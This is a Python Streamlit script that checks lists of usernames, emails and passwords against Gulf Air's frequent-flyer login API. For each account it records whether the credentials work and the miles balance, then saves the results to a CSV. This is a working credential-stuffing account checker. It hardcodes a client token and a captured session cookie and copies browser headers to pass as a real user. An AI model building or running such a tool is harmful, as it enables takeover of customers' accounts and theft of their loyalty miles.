import streamlit as st
import requests
import tempfile
import threading
import os


def delete_file_after_delay(file_path, delay=120):
    def delete_file():
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
                st.write(f"{file_path} has been deleted after {delay} seconds.")
        except Exception as e:
            st.error(f"Error deleting file: {e}")
    
    timer = threading.Timer(delay, delete_file)
    timer.start()






def account_status_process_for_gulfair(df):
    st.title('LOGS')

    df['Account Status']  = ''
    df['Account Balance'] = ''

    for index, row in df.iterrows():
        username = row['username']
        password = row['password']
        email    = row['email']

        if username == 'none':
            st.write(f"{index+1} - Attempting login for Email: {email} and {password}")
        else:
            st.write(f"{index+1} - Attempting login for Username: {username} and {password}")


        # Check if the username contains the string 'none', and if so, assign the email to username
        if username.lower() == 'none':
            username = ''
        elif email.lower() == 'none':
            email = ''


        if password and username or email:
            with requests.Session() as session:
                try:
                    token_url     = 'https://flights.gulfair.com/falcon/b2c/api/v2/token/get'
                    dashboard_url = 'https://flights.gulfair.com/falcon/rbe/api/v2/ffp/details'
                    form_data = {
                                "locale": "en",
                                "request": {
                                                "account_name": "ibe_anixe",
                                                "account_token": "aRAVXZK2n3FXh8ck",
                                                "client_device": "web_browser",
                                                "login":    username,
                                                "email":    email,
                                                "password": password,
                                                "type": "ffp"
                                            }
                                }
                    get_token = session.post(token_url, json=form_data)

                    if get_token.status_code == 200:
                        token = get_token.json()
                        token = token['response']['token']

                        headers_data =  {
                            "Accept": "application/json",
                            "Accept-Encoding": "gzip, deflate, br, zstd",
                            "Accept-Language": "en-US,en;q=0.5",
                            "Authorization": f"Bearer {token}",
                            "cache-control": "no-cache",
                            "Connection": "keep-alive",
                            "Content-Length": "28",
                            "Content-Type": "application/json",
                            "Cookie": "_gcl_au=1.1.520591335.1726819938; _ga_0QVNSNCG0T=GS1.1.1726836496.4.1.1726836866.60.0.0; _ga=GA1.2.1358393070.1726819939; _gid=GA1.2.1706995573.1726819946; _scid=xA_eQXCBcZzk5kIOPiUKGvIUmsuLPBf7; _sctr=1%7C1726815600000; _fbp=fb.1.1726819949488.959041827691663701; _tt_enable_cookie=1; _ttp=IFeSr1jkUuiOiETB1XaG97J0WRq; _ga_PQJGDMPK09=GS1.1.1726836496.3.1.1726836584.0.0.0; rack.session=BAh7B0kiD3Nlc3Npb25faWQGOgZFVG86HVJhY2s6OlNlc3Npb246OlNlc3Npb25JZAY6D0BwdWJsaWNfaWRJIkU2MWE1ZThiZDk2NmI0OTU1MTQ2MTEyNDhlNmUyY...BBTExPNGlabVJRemJ5NWVXZWY5MnJja2p1eFRUd2c3aGhiSkl4UVVQd08wRUZtSk9xRHMwb0s5MjFZRHdLZjA0eUhtbTF5Q1dxckRvYzdYMkc2dUZBL0k5S09xeFEvOGJrT01aNG1CS2k2aFEzMk9PTmk4YXBGeWFyNjloV2crNEZEQ2NtSk1ITG9iMks1MHJBVXRWejZNcFJWUlROQy8zdklCKzBwb3NwUlZYNjNrdkRRa1R3aXRlUjlnL1UxSkttVFhRPT0tLTBNQkQ4bC8rQkhPTjBIOHQtLVRJOVlBcEk4UzhaZW9OK1c0WWF1dnc9PSIsImV4cCI6MTcyNjg0MDQ3OX0.G9i-6iw6bVh4vN4aa0TIy2PLbFNg5KD2bB1HE9ypsqA",
                            "Host": "flights.gulfair.com",
                            "Origin": "https://flights.gulfair.com",
                            "Referer": "https://flights.gulfair.com/",
                            "Sec-Fetch-Dest": "empty",
                            "Sec-Fetch-Mode": "cors",
                            "Sec-Fetch-Site": "same-origin",
                            "TE": "trailers",
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0"
                        }

                        request_form_data =  {
                            "object": {
                            "companyCode": "GF",
                            "isBonusRequired": "Y",
                            "membershipNumber": username,
                            "programCode": "FF",
                            "tierOptionsRequired": True
                            }
                        }
                        dashboard_response = session.post(dashboard_url, headers=headers_data, json=form_data)
                        if dashboard_response.status_code == 200:
                            dashboard_response = dashboard_response.json()
                            point_dvalues = dashboard_response['response']['profile_data']['miles_balance']
                            st.success(f"Login Successful with a {point_dvalues} Miles Balance")
                            df.at[index, 'Account Balance'] = point_dvalues
                        else:
                            st.error(f"Can't Reach to Dashboard")
                        
                        df.at[index, 'Account Status'] = 'Valid'
                    else:
                        st.error(f"Login Failed with status code {get_token.status_code}")
                        df.at[index, 'Account Status']  = 'Invalid'

                except Exception as e:
                    st.error(f"An error occurred for {username}: {e}")

        else:
            st.warning(f"Missing username or password for row {index}.")
            df.at[index, 'Account Status'] = 'Missing Credentials'
    st.divider()





    with tempfile.NamedTemporaryFile(delete=False, suffix="pia_accounts_status.csv") as temp_file:
        df.to_csv(temp_file.name, index=False)
        temp_file_path = temp_file.name
        st.warning(f"Temporary CSV file Created at: {temp_file_path}")

    return df

